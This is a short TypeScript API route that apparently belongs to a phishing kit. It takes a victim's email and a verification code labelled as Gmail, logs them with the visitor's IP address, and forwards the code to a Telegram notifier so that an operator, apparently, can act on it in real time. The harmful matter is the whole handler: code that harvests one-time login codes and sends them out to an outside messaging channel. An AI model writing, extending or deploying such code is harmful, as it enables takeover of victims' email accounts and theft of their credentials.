import {
  assertConsent,
  ensureSession,
  getClientIp,
  getSessionId,
  jsonWithSession,
} from "@/lib/server/request";
import { appendSubmission, upsertSession } from "@/lib/server/store";
import { notifyTelegramSubmission } from "@/lib/server/telegram";

type Body = {
  email?: string;
  code?: string;
};

export async function POST(request: Request) {
  const sessionId = await getSessionId();
  const denied = await assertConsent(sessionId);
  if (denied) return denied;

  const body = (await request.json()) as Body;

  await ensureSession(sessionId);

  if (body.email) {
    await upsertSession(sessionId, {
      email: body.email,
      provider: "GMAIL",
      decision: null,
    });
  } else {
    await upsertSession(sessionId, { decision: null });
  }

  appendSubmission({
    sessionId,
    type: "code",
    provider: "GMAIL",
    email: body.email,
    code: body.code,
    ip: getClientIp(request),
  });

  try {
    await notifyTelegramSubmission(sessionId, { code: body.code });
  } catch (error) {
    console.error("Telegram SMS code notification failed:", error);
    return jsonWithSession(
      { success: false, error: "Failed to send notification" },
      sessionId,
      { status: 502 },
    );
  }

  return jsonWithSession(
    { success: true, message: "Code submitted successfully" },
    sessionId,
  );
}
